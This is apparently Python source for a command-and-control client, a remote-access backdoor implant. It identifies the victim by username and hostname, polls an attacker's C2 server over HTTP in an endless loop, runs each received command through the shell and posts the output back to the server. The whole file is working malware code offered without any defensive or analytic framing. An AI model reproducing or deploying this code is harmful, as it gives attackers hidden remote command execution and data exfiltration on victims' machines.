# Command and Control client Code

from os import getenv
from subprocess import run, PIPE, STDOUT
from time import sleep, time
from requests import exceptions, get, post
from sys import platform
from os import uname
from settings import PORT, CMD_REQUEST, CMD_RESPONSE, CMD_RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER

if getenv("OS") == "Windows_NT":
    client = getenv("USERNAME", "") + "@" + getenv("COMPUTERNAME", "") + "@" + str(time())
elif platform == "linux" or platform == "linux2":
    client = getenv("USER", "") + "@" + uname().nodename + "@" + str(time())
elif platform == "darwin":
    client = getenv("USER", "") + "@" + uname().nodename + "@" + str(time())
else:
    client = "unknown" + "@" + "unknown" + "@" + str(time())

while True:
    # Try an HTTP GET request to the c2 server and retrive a response; if it fails, keep trying forever
    try:
        response = get(url=f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)
    except exceptions.RequestException:
        sleep(DELAY)
        continue
    
    # Retrieve the command via the decoded content ot the response object
    command = response.content.decode()

    # Run our operating system command via the subprocess module's run function
    command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout

    # Send the command output to the c2 server
    post(url=f"http://{C2_SERVER}:{PORT}{CMD_RESPONSE}", data={CMD_RESPONSE_KEY: command_output}, headers=HEADER, proxies=PROXY)

    print(response.status_code)